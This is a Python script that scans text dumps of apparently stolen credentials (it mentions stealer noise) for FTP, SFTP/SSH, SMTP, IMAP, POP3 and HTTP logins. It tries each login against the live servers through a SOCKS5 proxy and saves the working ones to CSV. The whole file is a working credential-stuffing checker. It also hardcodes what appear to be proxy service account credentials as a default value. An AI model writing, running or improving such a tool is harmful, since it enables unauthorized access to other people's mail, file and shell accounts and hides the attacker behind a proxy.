#!/usr/bin/env python3
"""Live-check protocol credentials from classified dump files.

Scans text dumps for FTP / FTPS / SFTP / SSH / SMTP / SMTPS / IMAP / POP3 /
HTTP(S) credentials, attempts login, and writes valid combinations to a CSV.
HTTP(S) results are written to a separate "uncertain" CSV because the check
is a simple Basic Auth probe and produces many false positives.
Progress is persisted in a JSON state file so reruns resume where they left
off. Passwords are never echoed to stdout.

Examples
    python3 check_protocol_creds.py /Volumes/Untitled/cookies/data/0807/urlp/cleaned
    python3 check_protocol_creds.py /path/to/dumps --protocols ftp,sftp,smtp --out valid.csv
    python3 check_protocol_creds.py /path/to/dumps --no-proxy --max 1000 --recheck
"""

from __future__ import annotations

import argparse
import csv
import ftplib
import imaplib
import json
import logging
import os
import poplib
import re
import smtplib
import socket
import subprocess
import sys
import threading
import time
import warnings
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Callable
from urllib.parse import urlparse

try:
    import socks
except ImportError:
    socks = None  # type: ignore[assignment]

try:
    import requests
except ImportError:
    requests = None  # type: ignore[assignment]

try:
    import paramiko

    logging.getLogger("paramiko").setLevel(logging.CRITICAL)
except ImportError:
    paramiko = None  # type: ignore[assignment]

# Silence CryptographyDeprecationWarning spam from paramiko internals.
warnings.filterwarnings("ignore", category=DeprecationWarning)
warnings.filterwarnings("ignore", category=UserWarning)

# Fallback SOCKS5 proxy from existing scripts / env.
DEFAULT_SOCKS5 = os.environ.get(
    "SOCKS5_PROXY",
    "socks5://aFZPGm3WgPg4:MGQoj7uVjDrw@nyc.socks.ipvanish.com:1080",
)

DEFAULT_TIMEOUT = 15
DEFAULT_CONCURRENCY = 8

# Protocols we know how to validate.
PROTOCOLS = ["ftp", "ftps", "sftp", "ssh", "smtp", "smtps", "imap", "pop3", "http", "https"]
DEFAULT_PORTS = {
    "ftp": 21,
    "ftps": 990,
    "sftp": 22,
    "ssh": 22,
    "smtp": 587,
    "smtps": 465,
    "imap": 993,
    "pop3": 995,
    "http": 80,
    "https": 443,
}

SCHEME_RE = re.compile(r"^([a-z][a-z0-9+._-]*)://")
# Loose host / IPv4 matcher.
HOST_RE = re.compile(
    r"^([a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?\.)+[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?$"
)
IP_RE = re.compile(r"^(\d{1,3}\.){3}\d{1,3}$")
PORT_HINT = {
    "21": "ftp",
    "22": "ssh",
    "25": "smtp",
    "80": "http",
    "443": "https",
    "465": "smtps",
    "587": "smtp",
    "990": "ftps",
    "993": "imap",
    "995": "pop3",
}
# Host prefixes that imply a protocol when no scheme is present.
PREFIX_PROTO = [
    ("ftp.", "ftp"),
    ("sftp.", "sftp"),
    ("ssh.", "ssh"),
    ("smtp.", "smtp"),
    ("imap.", "imap"),
    ("pop.", "pop3"),
    ("pop3.", "pop3"),
    ("mail.", "imap"),
]


def configure_proxy(proxy_url: str | None) -> dict[str, str] | None:
    """Set PySocks default proxy and return a requests proxies dict."""
    if not proxy_url:
        return None
    parsed = urlparse(proxy_url)
    if parsed.scheme not in ("socks5", "socks5h"):
        return None
    if socks is None:
        raise RuntimeError("PySocks is required for SOCKS5 support: pip install pysocks")
    socks.set_default_proxy(
        socks.SOCKS5,
        parsed.hostname,
        parsed.port or 1080,
        rdns=True,
        username=parsed.username or None,
        password=parsed.password or None,
    )
    socket.socket = socks.socksocket  # type: ignore[misc]
    return {"http": proxy_url, "https": proxy_url}


@dataclass(frozen=True)
class Creds:
    protocol: str
    host: str
    port: int
    user: str
    password: str
    raw: str = ""

    def state_key(self) -> str:
        """Stable key for state tracking."""
        return f"{self.protocol}://{self.host}:{self.port}:{self.user}:{self.password}"


@dataclass
class Stats:
    checked: int = 0
    valid: int = 0
    uncertain: int = 0
    errors: int = 0
    skipped: int = 0
    by_protocol: dict[str, int] = field(default_factory=lambda: {p: 0 for p in PROTOCOLS})
    by_error: dict[str, int] = field(default_factory=dict)
    lock: threading.Lock = field(default_factory=threading.Lock)

    def bump(self, protocol: str, valid: bool, err: str = "") -> None:
        with self.lock:
            self.checked += 1
            if valid:
                self.valid += 1
                self.by_protocol[protocol] = self.by_protocol.get(protocol, 0) + 1
            else:
                self.errors += 1
                key = err or "fail"
                self.by_error[key] = self.by_error.get(key, 0) + 1

    def bump_uncertain(self) -> None:
        with self.lock:
            self.checked += 1
            self.uncertain += 1

    def bump_skipped(self, n: int = 1) -> None:
        with self.lock:
            self.skipped += n


def load_state(state_path: Path) -> dict:
    """Load or initialize the JSON state file."""
    if state_path.exists():
        try:
            data = json.loads(state_path.read_text(encoding="utf-8"))
            if isinstance(data, dict) and "checked" in data:
                return data
        except Exception as e:
            print(f"Warning: could not read state file {state_path}: {e}", file=sys.stderr)
    return {"version": 1, "checked": {}}


def save_state(state: dict, state_path: Path) -> None:
    """Atomically persist the JSON state file (caller must hold the lock)."""
    tmp = state_path.parent / f"{state_path.name}.tmp"
    try:
        tmp.write_text(json.dumps(state, indent=2), encoding="utf-8")
        tmp.replace(state_path)
    except Exception as e:
        print(f"Warning: failed to write state file {state_path}: {e}", file=sys.stderr)


def iso_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def normalize_scheme(scheme: str) -> str | None:
    """Recover from garbled schemes like ht7ps -> https."""
    s = scheme.lower()
    if s in DEFAULT_PORTS:
        return s
    if s in ("ht7ps", "ht7p"):
        return "https"
    # Common one-character replacements due to OCR/stealer noise.
    if re.match(r"^https?$", s.replace("0", "o").replace("7", "t").replace("1", "l")):
        return s.replace("0", "o").replace("7", "t").replace("1", "l")
    return None


def parse_line(line: str) -> Creds | None:
    """Extract protocol credentials from a single dump line."""
    line = line.strip()
    if not line or line.startswith("#"):
        return None

    protocol: str | None = None
    scheme_match = SCHEME_RE.match(line)
    rest = line
    if scheme_match:
        protocol = normalize_scheme(scheme_match.group(1))
        if not protocol:
            return None
        rest = line[scheme_match.end() :]

    parts = rest.split(":")
    if len(parts) < 3:
        return None

    host: str | None = None
    host_index: int | None = None
    for i, part in enumerate(parts):
        # remove leading slashes and any path on the host candidate
        candidate = part.lstrip("/").split("/")[0].strip()
        if HOST_RE.match(candidate) or IP_RE.match(candidate):
            host = candidate
            host_index = i
            break
    if not host or host_index is None:
        return None

    lower_host = host.lower()
    if not protocol:
        for prefix, proto in PREFIX_PROTO:
            if lower_host.startswith(prefix):
                protocol = proto
                break
    if not protocol:
        # Port hint on the token immediately following host.
        if host_index + 1 < len(parts) and parts[host_index + 1].isdigit():
            protocol = PORT_HINT.get(parts[host_index + 1])
    if not protocol:
        # Bare IP -> assume HTTP for broad checking.
        if IP_RE.match(host):
            protocol = "http"
        # Domain with no explicit protocol -> default to HTTP; user can filter later.
        elif HOST_RE.match(host) and "." in host:
            protocol = "http"
        # otherwise keep unknown and skip
    if not protocol:
        return None

    after_host = parts[host_index + 1 :]
    port = DEFAULT_PORTS[protocol]
    if after_host and after_host[0].isdigit() and 1 <= int(after_host[0]) <= 65535:
        port = int(after_host.pop(0))

    if len(after_host) < 2:
        return None
    user = after_host[0]
    password = ":".join(after_host[1:])
    if not user or not password:
        return None
    if user == password:
        return None

    return Creds(protocol=protocol, host=host, port=port, user=user, password=password, raw=line)


# ---- protocol checkers ----


def timeout_socket(timeout: int):
    """Set a global socket default timeout for stdlib network code."""
    socket.setdefaulttimeout(timeout)


def check_ftp(c: Creds, tls: bool = False) -> bool:
    cls = ftplib.FTP_TLS if tls else ftplib.FTP
    with cls(c.host, timeout=DEFAULT_TIMEOUT) as ftp:
        ftp.login(user=c.user, passwd=c.password)
    return True


def check_sftp_ssh(c: Creds) -> bool:
    if not paramiko:
        raise RuntimeError("paramiko not installed")
    sock = socket.create_connection((c.host, c.port), timeout=DEFAULT_TIMEOUT)
    try:
        transport = paramiko.Transport(sock)
        transport.banner_timeout = DEFAULT_TIMEOUT
        transport.auth_timeout = DEFAULT_TIMEOUT
        try:
            transport.connect(username=c.user, password=c.password)
        finally:
            transport.close()
    finally:
        sock.close()
    return True


def check_smtp(c: Creds) -> bool:
    if c.port == 465:
        with smtplib.SMTP_SSL(c.host, c.port, timeout=DEFAULT_TIMEOUT) as s:
            s.ehlo()
            s.login(c.user, c.password)
    else:
        with smtplib.SMTP(c.host, c.port, timeout=DEFAULT_TIMEOUT) as s:
            s.ehlo()
            try:
                s.starttls()
                s.ehlo()
            except Exception:
                pass
            s.login(c.user, c.password)
    return True


def check_imap(c: Creds) -> bool:
    with imaplib.IMAP4_SSL(c.host, c.port, timeout=DEFAULT_TIMEOUT) as m:
        m.login(c.user, c.password)
    return True


def check_pop3(c: Creds) -> bool:
    client = poplib.POP3_SSL(c.host, c.port, timeout=DEFAULT_TIMEOUT)
    try:
        client.user(c.user)
        client.pass_(c.password)
    finally:
        client.quit()
    return True


def check_http(c: Creds, proxies: dict[str, str] | None) -> bool:
    if not requests:
        raise RuntimeError("requests not installed")
    scheme = "https" if c.port == 443 or c.protocol == "https" else "http"
    url = f"{scheme}://{c.host}"
    if c.port not in (80, 443):
        url += f":{c.port}"
    resp = requests.get(
        url,
        auth=(c.user, c.password),
        proxies=proxies,
        timeout=(5, DEFAULT_TIMEOUT),
        allow_redirects=False,
    )
    # 2xx/3xx treat as reachable; 401/403 are explicit auth failures.
    if resp.status_code in (401, 403):
        return False
    if resp.status_code < 400:
        return True
    # Some endpoints return 404 even for valid creds; mark uncertain.
    raise RuntimeError(f"HTTP {resp.status_code}")


def run_check(c: Creds, proxies: dict[str, str] | None) -> bool:
    if c.protocol == "ftp":
        return check_ftp(c, tls=False)
    if c.protocol == "ftps":
        return check_ftp(c, tls=True)
    if c.protocol in ("sftp", "ssh"):
        return check_sftp_ssh(c)
    if c.protocol in ("smtp", "smtps"):
        return check_smtp(c)
    if c.protocol == "imap":
        return check_imap(c)
    if c.protocol == "pop3":
        return check_pop3(c)
    if c.protocol in ("http", "https"):
        return check_http(c, proxies)
    raise RuntimeError(f"unsupported protocol {c.protocol}")


def worker(
    c: Creds,
    proxies: dict[str, str] | None,
    stats: Stats,
    csv_writer: csv.writer,
    uncertain_writer: csv.writer,
    state: dict,
    state_path: Path,
) -> None:
    key = c.state_key()
    err = ""
    try:
        ok = run_check(c, proxies)
    except Exception as exc:
        err = type(exc).__name__
        ok = False

    # HTTP(S) checks are a simple Basic Auth probe; treat positives as uncertain.
    is_web = c.protocol in ("http", "https")
    status = "uncertain" if ok and is_web else ("valid" if ok else "invalid")

    with stats.lock:
        if ok:
            writer = uncertain_writer if is_web else csv_writer
            writer.writerow(
                [c.protocol, c.host, c.port, c.user, c.password, c.raw, iso_now()]
            )
            if is_web:
                stats.bump_uncertain()
                print(f"UNCERTAIN {c.protocol} {c.host}:{c.port} {c.user}")
            else:
                stats.valid += 1
                stats.by_protocol[c.protocol] = stats.by_protocol.get(c.protocol, 0) + 1
                print(f"VALID {c.protocol} {c.host}:{c.port} {c.user}")
            stats.checked += 1
        else:
            stats.errors += 1
            err_key = err or "fail"
            stats.by_error[err_key] = stats.by_error.get(err_key, 0) + 1
            stats.checked += 1

        # Persist state atomically for this credential.
        entry = state["checked"].get(key, {})
        entry.update(
            {
                "status": status,
                "error": err or None,
                "last_check": iso_now(),
                "attempts": entry.get("attempts", 0) + 1,
            }
        )
        state["checked"][key] = entry
        save_state(state, state_path)


def iter_candidates(root: Path, protocols: list[str]):
    """Yield Creds from all .txt files under root, using ripgrep when available."""
    protocols = [p for p in protocols if p in PROTOCOLS]
    if not protocols:
        return

    # Build a regex that matches either a scheme or a typical protocol host prefix.
    scheme_alts = "|".join(re.escape(p) + ":" for p in protocols if p in DEFAULT_PORTS)
    host_prefix_alts = "|".join(
        r"(?:^|:)(?:" + re.escape(prefix) + r")"
        for prefix, proto in PREFIX_PROTO
        if proto in protocols
    )
    full_pattern = f"({scheme_alts})|({host_prefix_alts})"

    rg = None
    try:
        rg = subprocess.Popen(
            ["rg", "-S", "-i", "--no-filename", "--glob", "*.txt", "-e", full_pattern, str(root)],
            stdout=subprocess.PIPE,
            text=True,
            errors="ignore",
        )
        source = rg.stdout
    except FileNotFoundError:
        source = None

    seen: set[tuple[str, str, str, str]] = set()

    def stream_lines():
        if source:
            for line in source:
                yield line
        else:
            for path in root.rglob("*.txt"):
                with path.open("r", errors="ignore") as f:
                    for line in f:
                        yield line
        if rg:
            source.close()
            rg.wait()

    for line in stream_lines():
        c = parse_line(line)
        if not c or c.protocol not in protocols:
            continue
        key = (c.protocol, c.host, c.user, c.password)
        if key in seen:
            continue
        seen.add(key)
        yield c


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Live-check protocol credentials from classified dump files."
    )
    ap.add_argument("dir", type=Path, help="Directory containing .txt dump files")
    ap.add_argument(
        "--protocols",
        default=",".join(PROTOCOLS),
        help="Comma-separated protocols to check (default: all)",
    )
    ap.add_argument("--out", type=Path, default=Path("valid_protocol_creds.csv"))
    ap.add_argument(
        "--uncertain-out",
        type=Path,
        default=None,
        help="CSV for uncertain HTTP(S) results (default: <out>_uncertain.csv)",
    )
    ap.add_argument("--state", type=Path, default=Path("protocol_creds_state.json"))
    ap.add_argument("--max", type=int, default=0, help="Maximum candidates to check (0 = unlimited)")
    ap.add_argument("--concurrency", type=int, default=DEFAULT_CONCURRENCY)
    ap.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT)
    ap.add_argument("--proxy", default=DEFAULT_SOCKS5, help="SOCKS5 proxy URL")
    ap.add_argument("--no-proxy", action="store_true", help="Skip proxy and connect directly")
    ap.add_argument("--recheck", action="store_true", help="Re-check credentials already in state")
    ap.add_argument("--dry-run", action="store_true", help="Parse and count only; no network checks")
    args = ap.parse_args()

    if not args.dir.is_dir():
        print(f"Error: not a directory: {args.dir}", file=sys.stderr)
        return 2

    protocols = [p.strip().lower() for p in args.protocols.split(",") if p.strip()]
    unknown = [p for p in protocols if p not in PROTOCOLS]
    if unknown:
        print(f"Unknown protocols: {unknown}. Supported: {PROTOCOLS}", file=sys.stderr)
        return 2

    if args.timeout:
        timeout_socket(args.timeout)

    if not args.no_proxy:
        try:
            proxies = configure_proxy(args.proxy)
        except Exception as e:
            print(f"Proxy setup failed: {e}", file=sys.stderr)
            return 1
    else:
        proxies = None

    stats = Stats()
    out_path: Path = args.out
    state_path: Path = args.state
    state = load_state(state_path)
    checked_keys = state["checked"]

    out_handle = None
    csv_writer = None
    uncertain_handle = None
    uncertain_writer = None
    if not args.dry_run:
        uncertain_path: Path = args.uncertain_out or out_path.with_name(
            f"{out_path.stem}_uncertain.csv"
        )
        out_path.parent.mkdir(parents=True, exist_ok=True)
        uncertain_path.parent.mkdir(parents=True, exist_ok=True)
        out_handle = out_path.open("w", newline="", encoding="utf-8")
        csv_writer = csv.writer(out_handle)
        csv_writer.writerow(["protocol", "host", "port", "user", "password", "raw", "timestamp"])
        uncertain_handle = uncertain_path.open("w", newline="", encoding="utf-8")
        uncertain_writer = csv.writer(uncertain_handle)
        uncertain_writer.writerow(
            ["protocol", "host", "port", "user", "password", "raw", "timestamp"]
        )

    candidates = iter_candidates(args.dir, protocols)
    pending: list[Creds] = []
    for c in candidates:
        if not args.recheck and c.state_key() in checked_keys:
            stats.bump_skipped()
            continue
        pending.append(c)
        if args.max and len(pending) >= args.max:
            break

    # Deterministic order so reruns with --max and --state skip consistently.
    pending.sort(key=lambda c: (c.protocol, c.host, c.port, c.user, c.password))

    print(f"Candidates to check: {len(pending)} (skipped already-checked: {stats.skipped})", file=sys.stderr)

    if args.dry_run:
        for c in pending:
            print(f"{c.protocol}://{c.host}:{c.port}\t{c.user}\t<hidden>")
        return 0

    with ThreadPoolExecutor(max_workers=args.concurrency) as pool:
        futures = [
            pool.submit(worker, c, proxies, stats, csv_writer, uncertain_writer, state, state_path)
            for c in pending
        ]
        for _ in as_completed(futures):
            pass

    if out_handle:
        out_handle.close()
    if uncertain_handle:
        uncertain_handle.close()

    print("\n--- summary ---", file=sys.stderr)
    print(f"Checked:    {stats.checked}", file=sys.stderr)
    print(f"Skipped:    {stats.skipped}", file=sys.stderr)
    print(f"Valid:      {stats.valid}", file=sys.stderr)
    print(f"Uncertain:  {stats.uncertain}", file=sys.stderr)
    print(f"Errors:     {stats.errors}", file=sys.stderr)
    for p in protocols:
        if stats.by_protocol.get(p, 0):
            print(f"  {p}: {stats.by_protocol.get(p, 0)}", file=sys.stderr)
    print(f"State:      {state_path}", file=sys.stderr)
    print(f"CSV out:    {out_path}", file=sys.stderr)
    if stats.uncertain:
        uncertain_path = args.uncertain_out or out_path.with_name(f"{out_path.stem}_uncertain.csv")
        print(f"Uncertain:  {uncertain_path}", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
